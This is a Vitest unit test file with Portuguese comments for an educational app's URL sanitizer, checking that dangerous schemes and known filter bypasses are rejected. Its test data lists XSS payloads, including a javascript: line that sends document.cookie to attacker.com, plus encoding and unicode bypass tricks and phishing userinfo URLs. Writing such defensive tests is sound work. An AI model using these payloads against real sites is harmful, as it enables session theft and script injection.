/**
 * Testes unitários para `lib/sanitize.ts` — focados em `isSafeUrl`,
 * que é a defesa de primeira linha contra XSS via URLs maliciosos
 * em recursos pedagógicos.
 */

import { describe, it, expect } from 'vitest'
import { isSafeUrl, safeUrl } from '@/lib/sanitize'

describe('isSafeUrl', () => {
  describe('schemes perigosos → rejeitados', () => {
    it.each([
      ['javascript:alert(1)'],
      ['JavaScript:void(0)'], // case-insensitive
      ['javascript:fetch("//attacker.com/"+document.cookie)'],
      ['data:text/html,<script>alert(1)</script>'],
      ['data:application/javascript,alert(1)'],
      ['vbscript:msgbox(1)'],
      ['file:///etc/passwd'],
      ['file://localhost/c:/windows'],
      ['blob:https://example.com/abc'],
      ['about:blank'],
      ['chrome-extension://abc/'],
      [' javascript:alert(1) '], // trim aplicado, ainda rejeita
      ['\tjavascript:alert(1)'],
    ])('rejeita "%s"', (url) => {
      expect(isSafeUrl(url)).toBe(false)
    })
  })

  describe('URLs seguros → aceites', () => {
    it.each([
      ['https://example.com'],
      ['https://example.com/path?q=1'],
      ['http://localhost:3000'],
      ['mailto:user@example.com'],
      ['/relative/path'], // path relativo
      ['#anchor'],
      ['?query=string'],
    ])('aceita "%s"', (url) => {
      expect(isSafeUrl(url)).toBe(true)
    })
  })

  describe('edge cases', () => {
    it('rejeita null/undefined/empty', () => {
      expect(isSafeUrl(null)).toBe(false)
      expect(isSafeUrl(undefined)).toBe(false)
      expect(isSafeUrl('')).toBe(false)
      expect(isSafeUrl('   ')).toBe(false)
    })

    it('rejeita strings sem scheme reconhecido', () => {
      expect(isSafeUrl('not-a-url')).toBe(false)
      expect(isSafeUrl('example.com')).toBe(false) // sem http://
    })
  })

  describe('bypasses auditados — tentativas concretas', () => {
    // Cada teste vem da auditoria da CHECK constraint do DB.
    // Mantemos sincronizados: se a regex DB bloqueia, o JS também.

    it.each([
      // URL encoding
      ['%6Aavascript:alert(1)'],
      ['javascript%3Aalert(1)'],
      // Double encoding
      ['%2566avascript:alert(1)'],
      // Unicode fullwidth (browsers não normalizam scheme)
      ['ｊａｖａｓｃｒｉｐｔ:alert(1)'],
      ['ｈｔｔｐｓ://attacker.com'],
      // RTL override
      ['‮tpircsavaj:alert(1)'],
      // BOM
      ['﻿https://attacker.com'],
      // Mixed case já testado acima
      // Newlines/CR/control chars no início
      ['\njavascript:alert(1)'],
      ['\rjavascript:alert(1)'],
      ['javascript:alert(1)'],
      // java\nscript: (mesmo se browser strip-asse \n, regra falha)
      ['java\nscript:alert(1)'],
      // Schemes "quase" válidos
      ['httpz://attacker.com'],
      ['httpss://attacker.com'],
      // HTML entity bypasses
      ['javascript&colon;alert(1)'],
    ])('bypass rejeitado: %s', (input) => {
      expect(isSafeUrl(input)).toBe(false)
    })

    it('bloqueia userinfo (phishing-by-link)', () => {
      // http://safe.com@attacker.com → vai para attacker.com.
      // Não é XSS mas é vector de phishing — bloqueado.
      expect(isSafeUrl('http://safe.com@attacker.com')).toBe(false)
      expect(isSafeUrl('https://google.com@evil.com/login')).toBe(false)
      expect(isSafeUrl('https://user:pass@host.com')).toBe(false)
      // Edge case: userinfo vazio (`https://@host`) — URL parser não
      // marca url.username, mas a regex defensiva bloqueia.
      expect(isSafeUrl('https://@safe.com')).toBe(false)
      expect(isSafeUrl('http://:@safe.com')).toBe(false)
    })

    it('permite @ em mailto local-part', () => {
      // mailto:user@example.com tem `user` como userinfo no URL parser
      // — verificamos pelo scheme antes de rejeitar userinfo.
      expect(isSafeUrl('mailto:user@example.com')).toBe(true)
      expect(isSafeUrl('mailto:professor@escola.edu.pt')).toBe(true)
    })

    it('permite @ em path/query de http(s) (não authority)', () => {
      // O @ em path é seguro, só rejeitamos no authority.
      expect(isSafeUrl('https://example.com/users/@joao')).toBe(true)
      expect(isSafeUrl('https://twitter.com/@safeclick')).toBe(true)
    })
  })
})

describe('safeUrl', () => {
  it('devolve o URL trimmed quando seguro', () => {
    expect(safeUrl('  https://example.com  ')).toBe('https://example.com')
  })

  it('devolve null quando inseguro', () => {
    expect(safeUrl('javascript:alert(1)')).toBeNull()
    expect(safeUrl(null)).toBeNull()
  })
})
